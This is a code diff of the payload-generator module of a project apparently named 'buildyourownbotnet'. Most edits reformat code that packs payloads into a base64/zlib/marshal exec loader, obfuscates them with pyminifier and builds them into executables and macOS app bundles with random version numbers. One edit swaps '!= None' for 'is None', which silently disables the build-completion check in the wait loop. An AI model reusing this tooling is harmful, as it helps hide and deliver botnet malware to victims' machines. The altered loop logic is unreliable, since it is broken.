@@ -20,7 +20,7 @@ import subprocess
 from buildyourownbotnet.core import util
 
 # templates
-template_main  = string.Template("""
+template_main = string.Template("""
 if __name__ == '__main__':
     _${VARIABLE} = ${FUNCTION}(${OPTIONS})
     """)
@@ -120,7 +120,8 @@ def compress(input):
     Returns compressed output as a string
 
     """
-    return "import zlib,base64,marshal;exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(input, '', 'exec')), 9))))
+    return "import zlib,base64,marshal;exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))".format(
+        repr(base64.b64encode(zlib.compress(marshal.dumps(compile(input, '', 'exec')), 9))))
 
 
 def obfuscate(input):
@@ -139,7 +140,9 @@ def obfuscate(input):
     temp.file.write(input)
     temp.file.close()
     name = os.path.join(tempfile.gettempdir(), temp.name)
-    obfs = subprocess.Popen('pyminifier -o {} --obfuscate-classes --obfuscate-variables --replacement-length=1 {}'.format(name, name), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
+    obfs = subprocess.Popen(
+        'pyminifier -o {} --obfuscate-classes --obfuscate-variables --replacement-length=1 {}'.format(name, name), 0,
+        None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
     obfs.wait()
     output = open(name, 'r').read().replace('# Created by pyminifier (https://github.com/liftoff/pyminifier)', '')
     os.remove(name)
@@ -156,7 +159,13 @@ def variable(length=6):
     Returns variable as a string
 
     """
-    return random.choice([chr(n) for n in range(97,123)]) + ''.join(random.choice([chr(n) for n in range(97,123)] + [chr(i) for i in range(48,58)] + [chr(i) for i in range(48,58)] + [chr(z) for z in range(65,91)]) for x in range(int(length)-1))
+    return random.choice([chr(n) for n in range(97, 123)]) + ''.join(random.choice(
+        [chr(n) for n in range(97, 123)] + [chr(i) for i in range(48, 58)] + [chr(i) for i in range(48, 58)] + [chr(z)
+                                                                                                                for z in
+                                                                                                                range(
+                                                                                                                    65,
+                                                                                                                    91)])
+                                                                     for x in range(int(length) - 1))
 
 
 def main(function, *args, **kwargs):
@@ -178,12 +187,12 @@ def main(function, *args, **kwargs):
     """
     global template_main
     options = list(args)
-    for k,v in kwargs.items():
+    for k, v in kwargs.items():
         if not v:
             continue
         k, v = str(k), str(v)
-        options.append("{}='{}'".format(k,v))
-    options = ', '.join(options)    
+        options.append("{}='{}'".format(k, v))
+    options = ', '.join(options)
     return template_main.substitute(VARIABLE=function.lower(), FUNCTION=function, OPTIONS=options)
 
 
@@ -224,13 +233,13 @@ def freeze(filename, icon=None, hidden=None, owner=None, operating_system=None, 
 
     basename = os.path.basename(filename)
     name = os.path.splitext(basename)[0]
-    path = os.path.splitdrive(os.path.abspath('.'))[1].replace('\\','/')
+    path = os.path.splitdrive(os.path.abspath('.'))[1].replace('\\', '/')
 
     # add user/owner output path if provided
     if owner:
         path = path + '/output/' + owner + '/src'
 
-    key = ''.join([random.choice([chr(i) for i in list(range(48,91)) + list(range(97,123))]) for _ in range(16)])
+    key = ''.join([random.choice([chr(i) for i in list(range(48, 91)) + list(range(97, 123))]) for _ in range(16)])
 
     imports = ['imp']
     with open(filename) as import_file:
@@ -256,7 +265,8 @@ def freeze(filename, icon=None, hidden=None, owner=None, operating_system=None, 
     if isinstance(hidden, list):
         imports.extend(hidden)
 
-    spec = template_spec.substitute(BASENAME=repr(basename), PATH=repr(path), IMPORTS=imports, NAME=repr(name), ICON=repr(icon))
+    spec = template_spec.substitute(BASENAME=repr(basename), PATH=repr(path), IMPORTS=imports, NAME=repr(name),
+                                    ICON=repr(icon))
     fspec = os.path.join(path, name + '.spec')
 
     with open(fspec, 'w') as fp:
@@ -270,11 +280,11 @@ def freeze(filename, icon=None, hidden=None, owner=None, operating_system=None, 
 
     # cross-compile executable for the specified os/arch using pyinstaller docker containers
     process = subprocess.Popen('docker run -v "$(pwd):/src/" {docker_container}'.format(
-                                src_path=os.path.dirname(path), 
-                                docker_container=operating_system + '-' + architecture), 
-                                0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, 
-                                cwd=path, 
-                                shell=True)
+        src_path=os.path.dirname(path),
+        docker_container=operating_system + '-' + architecture),
+        0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE,
+        cwd=path,
+        shell=True)
 
     start_time = time.time()
 
@@ -282,19 +292,20 @@ def freeze(filename, icon=None, hidden=None, owner=None, operating_system=None, 
     while True:
         try:
             line = process.stderr.readline().rstrip()
-        except: 
-            break
-        if line.strip() != None:
+        except Exception as e:
+            raise RuntimeError(e)
+        if line.strip() is None:
             util.display(line, color='reset', style='dim')
             line = line.decode('utf-8')
             if 'EXE' in line and 'complete' in line:
                 break
         time.sleep(0.25)
 
-        if (time.time() - start_time > 600):
+        if time.time() - start_time > 3600:
             raise RuntimeError("Timeout or out of memory")
 
-    output = os.path.join(path, 'dist', 'windows/{0}.exe'.format(name) if operating_system == 'win' else 'linux/{0}'.format(name))
+    output = os.path.join(path, 'dist',
+                          'windows/{0}.exe'.format(name) if operating_system == 'win' else 'linux/{0}'.format(name))
 
     # remove temporary files (.py, .spec)
     os.remove(basename)
@@ -317,7 +328,7 @@ def app(filename, icon=None):
     Returns output filename as a string
     """
     global template_plist
-    version = '%d.%d.%d' % (random.randint(0,3), random.randint(0,6), random.randint(1, 9))
+    version = '%d.%d.%d' % (random.randint(0, 3), random.randint(0, 6), random.randint(1, 9))
     baseName = os.path.basename(filename)
     bundleName = os.path.splitext(baseName)[0]
     appPath = os.path.join(os.getcwd(), '{}.app'.format(bundleName))
@@ -330,7 +341,8 @@ def app(filename, icon=None):
     executable = os.path.join(distPath, filename)
     bundleVersion = bundleName + ' ' + version
     bundleIdentity = 'com.' + bundleName
-    infoPlist = template_plist.substitute(BASE_NAME=baseName, BUNDLE_VERSION=bundleVersion, ICON_PATH=iconPath, BUNDLE_ID=bundleIdentity, BUNDLE_NAME=bundleName, VERSION=version)
+    infoPlist = template_plist.substitute(BASE_NAME=baseName, BUNDLE_VERSION=bundleVersion, ICON_PATH=iconPath,
+                                          BUNDLE_ID=bundleIdentity, BUNDLE_NAME=bundleName, VERSION=version)
     os.makedirs(distPath)
     os.mkdir(rsrcPath)
     with open(pkgPath, "w") as fp:
